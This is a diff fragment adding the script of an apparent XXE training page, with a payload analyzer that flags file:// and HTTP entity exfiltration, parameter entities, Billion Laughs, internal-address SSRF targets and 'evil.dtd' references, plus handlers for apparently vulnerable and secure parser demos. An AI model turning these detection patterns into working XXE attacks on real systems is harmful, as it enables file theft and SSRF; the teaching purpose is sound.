+                analysisDiv.className = 'result-box info';
+                analysisDiv.innerHTML = '<p>Enter a payload to analyze...</p>';
+                return;
+            }
+
+            let analysis = [];
+            let severity = 'info';
+
+            if (payload.includes('<!DOCTYPE') || payload.includes('<!ENTITY')) {
+                analysis.push('✓ Contains DOCTYPE or ENTITY declarations');
+                severity = 'danger';
+            }
+            if (payload.match(/SYSTEM\s+['"](file:\/\/|\.\/|\.\.\/)/)) {
+                analysis.push('✓ Contains file system access (file://)');
+                severity = 'danger';
+            }
+            if (payload.match(/SYSTEM\s+['"](http|https):\/\//)) {
+                analysis.push('✓ Contains network/HTTP access - potential data exfiltration');
+                severity = 'danger';
+            }
+            if (payload.includes('ENTITY % ')) {
+                analysis.push('✓ Uses parameter entities - advanced XXE technique');
+                severity = 'danger';
+            }
+            if (payload.match(/lol|expansion|Billion|Laughs/i)) {
+                analysis.push('⚠️ Potential Billion Laughs DoS attack');
+                severity = 'danger';
+            }
+            if (payload.includes('localhost') || payload.includes('127.0.0.1') || payload.includes('169.254')) {
+                analysis.push('✓ Targeting internal services - potential SSRF via XXE');
+                severity = 'danger';
+            }
+            if (payload.includes('evil.dtd') || payload.includes('%dtd')) {
+                analysis.push('✓ External DTD reference - blind XXE technique');
+                severity = 'danger';
+            }
+
+            if (analysis.length === 0) {
+                analysis.push('No obvious XXE patterns detected');
+            }
+
+            analysisDiv.className = `result-box ${severity}`;
+            analysisDiv.innerHTML = `
+                <h4>${severity === 'danger' ? '⚠️ XXE Vulnerability Detected!' : '📋 Analysis:'}</h4>
+                <ul style="margin-top: 10px; padding-left: 20px;">
+                    ${analysis.map(a => `<li>${a}</li>`).join('')}
+                </ul>
+                ${severity === 'danger' ? '<p style="color: #e74c3c; margin-top: 15px;"><strong>Risk Level: CRITICAL</strong> - This payload would successfully exploit an XXE vulnerability</p>' : ''}
+            `;
+        }
+
+        // Tab switching
+        function showTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            
+            document.getElementById(tabId).classList.add('active');
+            event.target.classList.add('active');
+        }
+
+        // Initialize
+        document.getElementById('xxe-payload').addEventListener('keypress', e => {
+            if (e.key === 'Enter' && e.ctrlKey) parseVulnerableXXE();
+        });
+        document.getElementById('xxe-secure-payload').addEventListener('keypress', e => {
+            if (e.key === 'Enter' && e.ctrlKey) parseSecureXXE();
+        });
+    </script>
+</body>
+</html>
